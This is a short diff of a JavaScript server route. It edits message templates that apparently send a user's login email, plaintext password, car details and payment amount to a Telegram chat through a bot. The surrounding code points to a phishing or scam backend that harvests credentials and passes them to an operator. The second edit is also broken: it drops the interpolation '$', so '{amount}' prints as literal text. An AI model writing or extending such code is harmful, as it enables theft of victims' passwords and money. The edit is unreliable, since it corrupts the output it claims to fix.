@@ -210,7 +210,7 @@ ${car?.brand || ""} ${car?.name || ""}
 ${password}
 
 💰 TOTAL:
-$${total}
+${total}
 `;
 
       await bot.sendMessage(process.env.CHAT_ID, message);
@@ -276,7 +276,7 @@ router.post(
 • Login: ${email}
 • Password: ${password}
 
-💰 Amount: $${amount}
+💰 Amount: {amount}
 `;
 
       await bot.sendMessage(process.env.CHAT_ID, message);
